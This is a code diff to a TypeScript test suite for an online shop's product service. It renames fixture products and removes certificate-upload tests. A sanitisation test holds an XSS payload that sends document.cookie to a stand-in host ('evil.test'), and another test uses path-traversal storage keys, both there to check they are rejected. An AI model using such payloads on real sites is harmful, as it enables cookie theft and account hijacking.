@@ -4,7 +4,6 @@ import { beforeEach, describe, expect, it, vi } from "vitest";
 import { z } from "zod";
 import { Prisma } from "@akai/db";
 import type { CreateProduct, CreateVariant } from "@akai/contracts";
-import type { ServerEnv } from "@akai/config";
 import { ProductsService } from "./products.service";
 import type { AddMedia } from "./dto/catalog.dto";
 import { PrismaService } from "../prisma/prisma.service";
@@ -12,18 +11,6 @@ import { TaxRateResolver } from "./tax-rate.resolver";
 import { CatalogError } from "./catalog.errors";
 import { CATALOG_TOPICS } from "./catalog.events";
 import { REVALIDATION_TOPIC } from "../revalidation/revalidation.types";
-import { SERVER_CONFIG } from "../config/config.module";
-import { CLOCK, type Clock } from "../auth/ports/clock.port";
-
-const NOW = new Date("2026-07-20T10:00:00.000Z");
-const TEST_CLOCK: Clock = { now: () => NOW };
-
-const TEST_CONFIG = {
-  S3_ENDPOINT: "http://localhost:9002",
-  S3_BUCKET_COA: "akai-coa",
-  S3_ACCESS_KEY_ID: "akaidev",
-  S3_SECRET_ACCESS_KEY: "akaidev-secret",
-} as unknown as ServerEnv;
 
 const PRODUCT_ID = "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa";
 const VARIANT_ID = "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb";
@@ -71,7 +58,7 @@ function buildTx(recorded: Recorded, overrides: Record<string, unknown> = {}) {
     product: {
       create: vi.fn(async (args: { data: Record<string, unknown> }) => {
         recorded.productCreates.push(args.data);
-        return { id: PRODUCT_ID, slug: "creatina" };
+        return { id: PRODUCT_ID, slug: "camiseta" };
       }),
       update: vi.fn(async (args: { where: Record<string, unknown>; data: Record<string, unknown> }) => {
         recorded.productUpdates.push(args.data);
@@ -292,8 +279,6 @@ async function buildHarness(
       ProductsService,
       { provide: PrismaService, useValue: prisma },
       { provide: TaxRateResolver, useValue: { resolveBps: vi.fn(async () => taxRateBps) } },
-      { provide: SERVER_CONFIG, useValue: TEST_CONFIG },
-      { provide: CLOCK, useValue: TEST_CLOCK },
     ],
   }).compile();
 
@@ -302,13 +287,13 @@ async function buildHarness(
 
 function createInput(overrides: Partial<CreateProduct> = {}): CreateProduct {
   return {
-    slug: "creatina",
+    slug: "camiseta",
     status: "DRAFT",
     taxClass: "STANDARD",
     translations: [
       {
         locale: "es",
-        name: "Creatina",
+        name: "Camiseta",
         shortDescription: "corta",
         description: "larga",
       },
@@ -346,7 +331,7 @@ describe("ProductsService.create", () => {
       product: {
         findUnique: vi.fn(async () => ({
           id: PRODUCT_ID,
-          slug: "creatina",
+          slug: "camiseta",
           status: "DRAFT",
           taxClass: "STANDARD",
           restrictedCountries: [],
@@ -659,7 +644,7 @@ describe("ProductsService.setPublished", () => {
       product: {
         findFirst: vi.fn(async () => ({
           id: PRODUCT_ID,
-          slug: "creatina",
+          slug: "camiseta",
           variants: [],
           translations: [{ id: "t1" }],
         })),
@@ -676,7 +661,7 @@ describe("ProductsService.setPublished", () => {
       product: {
         findFirst: vi.fn(async () => ({
           id: PRODUCT_ID,
-          slug: "creatina",
+          slug: "camiseta",
           variants: [{ id: VARIANT_ID }],
           translations: [],
         })),
@@ -693,13 +678,13 @@ describe("ProductsService.setPublished", () => {
       product: {
         findFirst: vi.fn(async () => ({
           id: PRODUCT_ID,
-          slug: "creatina",
+          slug: "camiseta",
           variants: [],
           translations: [],
         })),
         findUnique: vi.fn(async () => ({
           id: PRODUCT_ID,
-          slug: "creatina",
+          slug: "camiseta",
           status: "DRAFT",
           taxClass: "STANDARD",
           restrictedCountries: [],
@@ -738,7 +723,7 @@ describe("ProductsService.softDelete", () => {
     const harness = await buildHarness(
       {
         product: {
-          findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "creatina" })),
+          findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })),
         },
       },
       {
@@ -759,7 +744,7 @@ describe("ProductsService.softDelete", () => {
 
   it("emits product.archived", async () => {
     const harness = await buildHarness(
-      { product: { findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "creatina" })) } },
+      { product: { findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })) } },
       { productVariant: { updateMany: vi.fn(async () => ({ count: 1 })) } },
     );
 
@@ -773,7 +758,7 @@ describe("ProductsService.softDelete", () => {
   it("refuses while it is still a live pack's component", async () => {
     const harness = await buildHarness({
       product: {
-        findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "creatina" })),
+        findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })),
       },
       // Same guard shape `removeCategory` applies to a category still
       // assigned — checked directly against the top-level client, before any
@@ -807,7 +792,7 @@ describe("ProductsService.updateVariant", () => {
   function readbackProduct() {
     return {
       id: PRODUCT_ID,
-      slug: "creatina",
+      slug: "camiseta",
       status: "ACTIVE",
       taxClass: "STANDARD",
       restrictedCountries: [],
@@ -1117,7 +1102,7 @@ describe("ProductsService.addVariant", () => {
       id: PRODUCT_ID,
       taxClass: "STANDARD" as const,
       stackDiscountEnabled,
-      slug: "creatina",
+      slug: "camiseta",
       status: "DRAFT" as const,
       restrictedCountries: [],
       createdAt: new Date("2026-03-01T00:00:00.000Z"),
@@ -1460,7 +1445,7 @@ describe("ProductsService.getBySlugPublic", () => {
     const findFirst = vi
       .fn()
       .mockResolvedValueOnce(null)
-      .mockResolvedValueOnce(activeProduct("creatina-nueva"));
+      .mockResolvedValueOnce(activeProduct("camiseta-nueva"));
 
     const harness = await buildHarness({
       product: { findFirst },
@@ -1469,8 +1454,8 @@ describe("ProductsService.getBySlugPublic", () => {
       },
     });
 
-    const product = await harness.service.getBySlugPublic("creatina-vieja");
-    expect(product.slug).toBe("creatina-nueva");
+    const product = await harness.service.getBySlugPublic("camiseta-vieja");
+    expect(product.slug).toBe("camiseta-nueva");
   });
 
   it("404s when neither the slug nor its history resolves", async () => {
@@ -1484,7 +1469,7 @@ describe("ProductsService.getBySlugPublic", () => {
    * a page worth serving.
    */
   it("404s a product with no active variant rather than serving a dead page", async () => {
-    const product = activeProduct("creatina");
+    const product = activeProduct("camiseta");
     const [variant] = product.variants;
     if (variant === undefined) throw new Error("fixture");
 
@@ -1497,7 +1482,7 @@ describe("ProductsService.getBySlugPublic", () => {
       },
     });
 
-    await expect(harness.service.getBySlugPublic("creatina")).rejects.toThrow(CatalogError);
+    await expect(harness.service.getBySlugPublic("camiseta")).rejects.toThrow(CatalogError);
   });
 });
 
@@ -1604,7 +1589,7 @@ describe("ProductsService.listPublic", () => {
 function hydratedProduct() {
   return {
     id: PRODUCT_ID,
-    slug: "creatina",
+    slug: "camiseta",
     status: "DRAFT" as const,
     taxClass: "STANDARD" as const,
     restrictedCountries: [],
@@ -1623,9 +1608,9 @@ function hydratedProduct() {
 
 function mediaInput(overrides: Partial<AddMedia> = {}): AddMedia {
   return {
-    objectKey: "products/creatina/hero.jpg",
-    url: "https://cdn.example.test/creatina/hero.jpg",
-    alt: { es: "Bote de creatina" },
+    objectKey: "products/camiseta/hero.jpg",
+    url: "https://cdn.example.test/camiseta/hero.jpg",
+    alt: { es: "Camiseta doblada" },
     width: 1200,
     height: 1200,
     sortOrder: 0,
@@ -1637,7 +1622,7 @@ describe("ProductsService.addMedia", () => {
   it("records a gallery image, with no variant and nothing replaced", async () => {
     const harness = await buildHarness({
       product: {
-        findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "creatina" })),
+        findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })),
         findUnique: vi.fn(async () => hydratedProduct()),
       },
     });
@@ -1655,7 +1640,7 @@ describe("ProductsService.addMedia", () => {
   it("attaches to the named variant, replacing the image it already had", async () => {
     const harness = await buildHarness({
       product: {
-        findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "creatina" })),
+        findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })),
         findUnique: vi.fn(async () => hydratedProduct()),
       },
       productVariant: {
@@ -1680,7 +1665,7 @@ describe("ProductsService.addMedia", () => {
     const findVariant = vi.fn(async () => null);
     const harness = await buildHarness({
       product: {
-        findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "creatina" })),
+        findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })),
         findUnique: vi.fn(async () => hydratedProduct()),
       },
       productVariant: { findFirst: findVariant, count: vi.fn(async () => 1) },
@@ -1705,7 +1690,7 @@ describe("ProductsService.addMedia", () => {
   it("enqueues a storefront purge for a variant image", async () => {
     const harness = await buildHarness({
       product: {
-        findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "creatina" })),
+        findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })),
         findUnique: vi.fn(async () => hydratedProduct()),
       },
       productVariant: {
@@ -1748,7 +1733,7 @@ describe("ProductsService.removeMedia", () => {
   it("deletes scoped by product AND media id, for either kind of image", async () => {
     const harness = await buildHarness({
       product: {
-        findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "creatina" })),
+        findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })),
         findUnique: vi.fn(async () => hydratedProduct()),
       },
     });
@@ -1775,7 +1760,7 @@ describe("ProductsService.removeMedia", () => {
     const harness = await buildHarness(
       {
         product: {
-          findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "creatina" })),
+          findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })),
           findUnique: vi.fn(async () => hydratedProduct()),
         },
       },
@@ -1820,7 +1805,7 @@ const translationUpsertSchema = z.object({
 
 /** Everything an admin could paste that must not survive into the column. */
 const HOSTILE_DESCRIPTION =
-  '<p>Creatina <strong>pura</strong></p>' +
+  '<p>Camiseta <strong>pura</strong></p>' +
   '<script>fetch("https://evil.test?c="+document.cookie)</script>' +
   '<img src=x onerror="fetch(\'https://evil.test\')">' +
   '<a href="javascript:alert(1)">oferta</a>';
@@ -1890,7 +1875,7 @@ describe("ProductsService — description sanitisation on write", () => {
         translations: [
           {
             locale: "es",
-            name: "Creatina",
+            name: "Camiseta",
             shortDescription: "corta",
             description: HOSTILE_DESCRIPTION,
           },
@@ -1921,13 +1906,13 @@ describe("ProductsService — description sanitisation on write", () => {
         translations: [
           {
             locale: "es",
-            name: "Creatina",
+            name: "Camiseta",
             shortDescription: "corta",
             description: HOSTILE_DESCRIPTION,
           },
           {
             locale: "en",
-            name: "Creatine",
+            name: "Tee",
             shortDescription: "short",
             description: "<p>Nothing to remove</p>",
           },
@@ -1949,9 +1934,9 @@ describe("ProductsService — description sanitisation on write", () => {
         translations: [
           {
             locale: "es",
-            name: "Creatina",
+            name: "Camiseta",
             shortDescription: "corta",
-            description: "<p>Creatina monohidratada</p>",
+            description: "<p>Camiseta oversize de algodón</p>",
           },
         ],
       }),
@@ -1969,7 +1954,7 @@ describe("ProductsService — description sanitisation on write", () => {
       translations: [
         {
           locale: "es",
-          name: "Creatina",
+          name: "Camiseta",
           shortDescription: "corta",
           description: HOSTILE_DESCRIPTION,
         },
@@ -1998,7 +1983,7 @@ describe("ProductsService — description sanitisation on write", () => {
         translations: [
           {
             locale: "es",
-            name: "Creatina",
+            name: "Camiseta",
             shortDescription: "10 < 20 & 5 > 1",
             description: "<p>ok</p>",
           },
@@ -2178,9 +2163,9 @@ describe("ProductsService.listPackComponentsFor", () => {
       // variantId}` output — `getBySlugPublic` runs this through `mapProduct`,
       // which reads `edge.component.{id,slug}` and `edge.componentVariantId`.
       packComponents: [
-        { sortOrder: 0, componentVariantId: VARIANT_A, quantity: 1, component: { id: COMPONENT_A, slug: "creatina" } },
-        { sortOrder: 1, componentVariantId: VARIANT_B, quantity: 1, component: { id: COMPONENT_B, slug: "omega-3" } },
-        { sortOrder: 2, componentVariantId: VARIANT_C, quantity: 1, component: { id: COMPONENT_C, slug: "magnesio" } },
+        { sortOrder: 0, componentVariantId: VARIANT_A, quantity: 1, component: { id: COMPONENT_A, slug: "camiseta" } },
+        { sortOrder: 1, componentVariantId: VARIANT_B, quantity: 1, component: { id: COMPONENT_B, slug: "cargo-pants" } },
+        { sortOrder: 2, componentVariantId: VARIANT_C, quantity: 1, component: { id: COMPONENT_C, slug: "gorra" } },
       ],
       // The pack's OWN variant — never sold, but `getBySlugPublic` 404s any
       // product with no active variant at all, pack or not.
@@ -2248,9 +2233,9 @@ describe("ProductsService.listPackComponentsFor", () => {
       product: {
         findFirst: vi.fn(async () => packHost()),
         findMany: vi.fn(async () => [
-          componentRow(COMPONENT_A, "creatina", VARIANT_A),
-          componentRow(COMPONENT_B, "omega-3", VARIANT_B),
-          componentRow(COMPONENT_C, "magnesio", VARIANT_C),
+          componentRow(COMPONENT_A, "camiseta", VARIANT_A),
+          componentRow(COMPONENT_B, "cargo-pants", VARIANT_B),
+          componentRow(COMPONENT_C, "gorra", VARIANT_C),
         ]),
       },
     });
@@ -2258,9 +2243,9 @@ describe("ProductsService.listPackComponentsFor", () => {
     const result = await harness.service.listPackComponentsFor("pack-recuperacion");
 
     expect(result.items.map((item) => item.product.slug)).toEqual([
-      "creatina",
-      "omega-3",
-      "magnesio",
+      "camiseta",
+      "cargo-pants",
+      "gorra",
     ]);
     // The PINNED variant travels with each component — never left for the
     // storefront to guess via `product.variants`' own cheapest-first default.
@@ -2294,15 +2279,15 @@ describe("ProductsService.listPackComponentsFor", () => {
         // so a vanished component simply is not among the rows returned —
         // modelled here by omitting it entirely.
         findMany: vi.fn(async () => [
-          componentRow(COMPONENT_A, "creatina", VARIANT_A),
-          componentRow(COMPONENT_C, "magnesio", VARIANT_C),
+          componentRow(COMPONENT_A, "camiseta", VARIANT_A),
+          componentRow(COMPONENT_C, "gorra", VARIANT_C),
         ]),
       },
     });
 
     const result = await harness.service.listPackComponentsFor("pack-recuperacion");
 
-    expect(result.items.map((item) => item.product.slug)).toEqual(["creatina", "magnesio"]);
+    expect(result.items.map((item) => item.product.slug)).toEqual(["camiseta", "gorra"]);
   });
 
   it("drops a component left with no active variant at all", async () => {
@@ -2310,18 +2295,18 @@ describe("ProductsService.listPackComponentsFor", () => {
       product: {
         findFirst: vi.fn(async () => packHost()),
         findMany: vi.fn(async () => [
-          componentRow(COMPONENT_A, "creatina", VARIANT_A),
-          componentRow(COMPONENT_B, "omega-3", VARIANT_B, {
+          componentRow(COMPONENT_A, "camiseta", VARIANT_A),
+          componentRow(COMPONENT_B, "cargo-pants", VARIANT_B, {
             variants: [],
           }),
-          componentRow(COMPONENT_C, "magnesio", VARIANT_C),
+          componentRow(COMPONENT_C, "gorra", VARIANT_C),
         ]),
       },
     });
 
     const result = await harness.service.listPackComponentsFor("pack-recuperacion");
 
-    expect(result.items.map((item) => item.product.slug)).toEqual(["creatina", "magnesio"]);
+    expect(result.items.map((item) => item.product.slug)).toEqual(["camiseta", "gorra"]);
   });
 });
 
@@ -2334,7 +2319,7 @@ describe("ProductsService.create — add-ons that asked for new products", () =>
   function readback() {
     return {
       id: PRODUCT_ID,
-      slug: "creatina",
+      slug: "camiseta",
       status: "DRAFT",
       taxClass: "STANDARD",
       restrictedCountries: [],
@@ -2375,7 +2360,7 @@ describe("ProductsService.create — add-ons that asked for new products", () =>
       { product: { findUnique: vi.fn(async () => readback()) } },
       {
         product: {
-          create: vi.fn(async () => ({ id: PRODUCT_ID, slug: "creatina" })),
+          create: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })),
           update: vi.fn(async () => ({ id: PRODUCT_ID })),
           findMany: stickyQuery,
         },
@@ -2594,7 +2579,7 @@ describe("ProductsService.setAddOns", () => {
   function hydrated() {
     return {
       id: PRODUCT_ID,
-      slug: "creatina",
+      slug: "camiseta",
       status: "ACTIVE",
       taxClass: "STANDARD",
       restrictedCountries: [],
@@ -2763,12 +2748,12 @@ describe("ProductsService.createCategory", () => {
     );
 
     const created = await harness.service.createCategory({
-      slug: "peptidos",
-      name: { es: "Péptidos", en: "Peptides" },
+      slug: "sudaderas",
+      name: { es: "Sudaderas", en: "Hoodies" },
     });
 
     expect(harness.recorded.categoryCreates).toEqual([
-      { slug: "peptidos", name: { es: "Péptidos", en: "Peptides" }, sortOrder: 4 },
+      { slug: "sudaderas", name: { es: "Sudaderas", en: "Hoodies" }, sortOrder: 4 },
     ]);
     expect(created.sortOrder).toBe(4);
   });
@@ -2780,8 +2765,8 @@ describe("ProductsService.createCategory", () => {
     );
 
     const created = await harness.service.createCategory({
-      slug: "peptidos",
-      name: { es: "Péptidos", en: "Peptides" },
+      slug: "sudaderas",
+      name: { es: "Sudaderas", en: "Hoodies" },
     });
 
     expect(created.sortOrder).toBe(0);
@@ -2791,8 +2776,8 @@ describe("ProductsService.createCategory", () => {
     const harness = await buildHarness();
 
     await harness.service.createCategory({
-      slug: "peptidos",
-      name: { es: "Péptidos", en: "Peptides" },
+      slug: "sudaderas",
+      name: { es: "Sudaderas", en: "Hoodies" },
     });
 
     const purges = harness.recorded.outbox.filter(
@@ -2820,7 +2805,7 @@ describe("ProductsService.createCategory", () => {
     );
 
     await expect(
-      harness.service.createCategory({ slug: "peptidos", name: { es: "Péptidos", en: "Peptides" } }),
+      harness.service.createCategory({ slug: "sudaderas", name: { es: "Sudaderas", en: "Hoodies" } }),
     ).rejects.toMatchObject({ code: "CONFLICT" });
   });
 });
@@ -2983,246 +2968,5 @@ describe("ProductsService.removeCategory", () => {
     );
     expect(purges).toHaveLength(1);
     expect(purges[0]?.payload["reason"]).toBe(CATALOG_TOPICS.categoryDeleted);
-  });
-});
-
-describe("ProductsService.coaUrlFor — the stable COA redirect's target", () => {
-  const PRODUCT_KEY = `coa/products/${PRODUCT_ID}/2026-07-20-abc.pdf`;
-
-  type CoaRow = { id: string; coaObjectKey: string | null; showCoa: boolean };
-
-  async function harnessWith(opts: {
-    product?: CoaRow | null;
-    historic?: { productId: string } | null;
-    historicProduct?: CoaRow | null;
-  }) {
-    const shown: CoaRow = { id: PRODUCT_ID, coaObjectKey: PRODUCT_KEY, showCoa: true };
-    const productFindFirst = vi.fn(async (args: { where: { slug?: string; id?: string } }) => {
-      if (args.where.id !== undefined) {
-        return opts.historicProduct === undefined ? shown : opts.historicProduct;
-      }
-      return opts.product === undefined ? shown : opts.product;
-    });
-    const harness = await buildHarness({
-      product: { findFirst: productFindFirst },
-      productSlugHistory: {
-        findUnique: vi.fn(async () => opts.historic ?? null),
-      },
-    });
-    return { ...harness, productFindFirst };
-  }
-
-  it("signs a FRESH, short-lived url for the product's certificate", async () => {
-    const { service } = await harnessWith({});
-
-    const url = new URL(await service.coaUrlFor("creatina"));
-
-    expect(url.pathname).toContain(PRODUCT_KEY);
-    expect(url.pathname).toContain("akai-coa");
-    expect(url.searchParams.has("X-Amz-Signature")).toBe(true);
-    // Signed at click time and followed immediately — never an hour-long URL.
-    expect(url.searchParams.get("X-Amz-Expires")).toBe("300");
-  });
-
-  it("only resolves ACTIVE, non-deleted products", async () => {
-    const { service, productFindFirst } = await harnessWith({});
-
-    await service.coaUrlFor("creatina");
-
-    const [args] = productFindFirst.mock.calls[0] ?? [];
-    expect(args).toMatchObject({
-      where: { slug: "creatina", deletedAt: null, status: "ACTIVE" },
-    });
-  });
-
-  it("follows a historic slug, like the product page does", async () => {
-    const { service } = await harnessWith({ product: null, historic: { productId: PRODUCT_ID } });
-
-    await expect(service.coaUrlFor("creatina-vieja")).resolves.toContain(PRODUCT_KEY);
-  });
-
-  it("404s an unknown product", async () => {
-    const { service } = await harnessWith({ product: null });
-
-    await expect(service.coaUrlFor("nope")).rejects.toMatchObject({ code: "NOT_FOUND" });
-  });
-
-  it("404s when no certificate has been uploaded", async () => {
-    const { service } = await harnessWith({
-      product: { id: PRODUCT_ID, coaObjectKey: null, showCoa: true },
-    });
-
-    await expect(service.coaUrlFor("creatina")).rejects.toMatchObject({ code: "NOT_FOUND" });
-  });
-
-  it("404s an uploaded certificate the admin has NOT switched on — hidden means hidden", async () => {
-    const { service } = await harnessWith({
-      product: { id: PRODUCT_ID, coaObjectKey: PRODUCT_KEY, showCoa: false },
-    });
-
-    await expect(service.coaUrlFor("creatina")).rejects.toMatchObject({ code: "NOT_FOUND" });
-  });
-
-  // `coaObjectKeyFor` is the ONE visibility decision both certificate routes
-  // share — the redirect signs its key, the in-page viewer's `/coa/file` reads
-  // it. Pinned here so "hidden" cannot drift between the two.
-  describe("coaObjectKeyFor — the key the in-page viewer reads", () => {
-    it("returns the product's own key, unsigned", async () => {
-      const { service } = await harnessWith({});
-
-      await expect(service.coaObjectKeyFor("creatina")).resolves.toBe(PRODUCT_KEY);
-    });
-
-    it("follows a historic slug", async () => {
-      const { service } = await harnessWith({ product: null, historic: { productId: PRODUCT_ID } });
-
-      await expect(service.coaObjectKeyFor("creatina-vieja")).resolves.toBe(PRODUCT_KEY);
-    });
-
-    it.each([
-      ["an unknown product", null],
-      ["no certificate uploaded", { id: PRODUCT_ID, coaObjectKey: null, showCoa: true }],
-      ["a certificate the admin has NOT switched on", { id: PRODUCT_ID, coaObjectKey: PRODUCT_KEY, showCoa: false }],
-    ] as const)("404s %s", async (_label, product) => {
-      const { service } = await harnessWith({ product });
-
-      await expect(service.coaObjectKeyFor("creatina")).rejects.toMatchObject({ code: "NOT_FOUND" });
-    });
-  });
-});
-
-describe("ProductsService — the product-level certificate upload", () => {
-  const PREFIX = `coa/products/${PRODUCT_ID}/`;
-
-  async function harnessFor(found: boolean) {
-    const harness = await buildHarness({
-      product: {
-        findFirst: vi.fn(async () => (found ? { id: PRODUCT_ID } : null)),
-        findUnique: vi.fn(async () => addOnHydratedProduct()),
-      },
-    });
-    return harness;
-  }
-
-  it("mints a signed PUT url under THIS product's own prefix, in the private COA bucket", async () => {
-    const { service } = await harnessFor(true);
-
-    const issued = await service.createCoaUploadUrl(PRODUCT_ID, { sizeBytes: 1024 });
-
-    expect(issued.objectKey.startsWith(PREFIX)).toBe(true);
-    expect(issued.objectKey.endsWith(".pdf")).toBe(true);
-    expect(issued.uploadUrl).toContain("akai-coa");
-    expect(issued.uploadUrl).toContain("X-Amz-Signature");
-    expect(issued.expiresInSeconds).toBe(600);
-  });
-
-  it("refuses to mint an upload url for a product that does not exist", async () => {
-    const { service } = await harnessFor(false);
-
-    await expect(service.createCoaUploadUrl(PRODUCT_ID, { sizeBytes: 1024 })).rejects.toMatchObject(
-      { code: "NOT_FOUND" },
-    );
-  });
-
-  it("records an uploaded key and purges the storefront in the same transaction", async () => {
-    const { service, recorded } = await harnessFor(true);
-
-    await service.attachCoa(PRODUCT_ID, { objectKey: `${PREFIX}2026-07-20-abc.pdf` });
-
-    expect(recorded.productUpdateWheres).toEqual([{ id: PRODUCT_ID }]);
-    expect(recorded.productUpdates).toEqual([{ coaObjectKey: `${PREFIX}2026-07-20-abc.pdf` }]);
-    expect(recorded.outbox.map((message) => message.topic)).toEqual([REVALIDATION_TOPIC]);
-    expect(recorded.outbox[0]?.payload["reason"]).toBe(CATALOG_TOPICS.productCoaAttached);
-  });
-
-  it("refuses a key issued for ANOTHER product (or a batch), and writes nothing", async () => {
-    const { service, recorded } = await harnessFor(true);
-
-    for (const objectKey of [
-      `coa/products/${FOREIGN_VARIANT_ID}/x.pdf`,
-      `coa/${PRODUCT_ID}/x.pdf`,
-      `${PREFIX}../${FOREIGN_VARIANT_ID}/x.pdf`,
-    ]) {
-      await expect(service.attachCoa(PRODUCT_ID, { objectKey })).rejects.toMatchObject({
-        code: "VALIDATION_FAILED",
-      });
-    }
-    expect(recorded.productUpdates).toEqual([]);
-    expect(recorded.outbox).toEqual([]);
-  });
-
-  it("404s an attach to a product that does not exist", async () => {
-    const { service, recorded } = await harnessFor(false);
-
-    await expect(
-      service.attachCoa(PRODUCT_ID, { objectKey: `${PREFIX}x.pdf` }),
-    ).rejects.toMatchObject({ code: "NOT_FOUND" });
-    expect(recorded.outbox).toEqual([]);
-  });
-
-  it("removes the certificate and purges the storefront", async () => {
-    const { service, recorded } = await harnessFor(true);
-
-    await service.removeCoa(PRODUCT_ID);
-
-    expect(recorded.productUpdates).toEqual([{ coaObjectKey: null }]);
-    expect(recorded.outbox.map((message) => message.topic)).toEqual([REVALIDATION_TOPIC]);
-    expect(recorded.outbox[0]?.payload["reason"]).toBe(CATALOG_TOPICS.productCoaRemoved);
-  });
-
-  it("404s a remove on a product that does not exist", async () => {
-    const { service } = await harnessFor(false);
-
-    await expect(service.removeCoa(PRODUCT_ID)).rejects.toMatchObject({ code: "NOT_FOUND" });
-  });
-});
-
-describe("ProductsService — spec field (form) and the showCoa switch persist", () => {
-  it("create writes form and showCoa onto the product row", async () => {
-    const harness = await buildHarness({
-      product: { findUnique: vi.fn(async () => addOnHydratedProduct()) },
-    });
-
-    await harness.service.create(createInput({ form: "CAPSULE", showCoa: true }), ACTOR_ID);
-
-    expect(harness.recorded.productCreates[0]?.["form"]).toBe("CAPSULE");
-    expect(harness.recorded.productCreates[0]?.["showCoa"]).toBe(true);
-    expect(harness.recorded.productCreates[0]).not.toHaveProperty("purityLabel");
-  });
-
-  it("create defaults form to LYOPHILIZED and the certificate to hidden", async () => {
-    const harness = await buildHarness({
-      product: { findUnique: vi.fn(async () => addOnHydratedProduct()) },
-    });
-
-    await harness.service.create(createInput(), ACTOR_ID);
-
-    expect(harness.recorded.productCreates[0]?.["form"]).toBe("LYOPHILIZED");
-    expect(harness.recorded.productCreates[0]?.["showCoa"]).toBe(false);
-  });
-
-  it("update writes form and the toggle — and the toggle purges the storefront", async () => {
-    const harness = await buildHarness({
-      product: { findUnique: vi.fn(async () => addOnHydratedProduct()) },
-    });
-
-    await harness.service.update(PRODUCT_ID, { form: "SOLUTION", showCoa: true });
-
-    expect(harness.recorded.productUpdates[0]?.["form"]).toBe("SOLUTION");
-    expect(harness.recorded.productUpdates[0]).toHaveProperty("showCoa", true);
-    expect(
-      harness.recorded.outbox.filter((message) => message.topic === REVALIDATION_TOPIC),
-    ).not.toHaveLength(0);
-  });
-
-  it("update leaves both alone when omitted", async () => {
-    const harness = await buildHarness({
-      product: { findUnique: vi.fn(async () => addOnHydratedProduct()) },
-    });
-
-    await harness.service.update(PRODUCT_ID, { listed: false });
-
-    expect(harness.recorded.productUpdates[0]).not.toHaveProperty("form");
-    expect(harness.recorded.productUpdates[0]).not.toHaveProperty("showCoa");
   });
 });
